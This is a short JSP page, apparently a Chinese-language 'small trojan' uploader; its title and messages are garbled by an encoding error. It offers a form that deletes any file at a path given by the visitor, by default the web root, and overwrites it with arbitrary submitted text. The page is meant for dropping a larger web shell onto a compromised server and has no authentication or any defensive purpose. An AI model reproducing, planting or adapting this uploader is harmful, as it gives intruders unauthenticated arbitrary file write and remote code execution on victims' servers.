<%@ page language="java" pageEncoding="gbk"%>
<jsp:directive.page import="java.io.File"/>
<jsp:directive.page import="java.io.OutputStream"/>
<jsp:directive.page import="java.io.FileOutputStream"/>
<html>
  <head> 
    <title>å°é©¬</title>
<meta http-equiv="keywords" content="å°é©¬">
<meta http-equiv="description" content="å°é©¬">
  </head>
  <%
  int i=0;
   String method=request.getParameter("act");
   if(method!=null&&method.equals("up")){
    String url=request.getParameter("url");
    String text=request.getParameter("text");
     File f=new File(url);
     if(f.exists()){
      f.delete();
     }
     try{
      OutputStream o=new FileOutputStream(f);
      o.write(text.getBytes());
      o.close();
     }catch(Exception e){
      i++;
       %>
       ä¸ä¼ ä¸æå
       <% 
      }
      }
      if(i==0){
      %>
       ä¸ä¼ æå
     <%
    } 
  %>
  
  <body>
<form action='?act=up'  method='post'>
  <input size="100" value="<%=application.getRealPath("/") %>" name="url"><br>
  <textarea rows="20" cols="80" name="text">è¿åé©¬çä»£ç </textarea><br>
  <input type="submit" value="up" name="text"/>
</form>
  </body>
</html> 

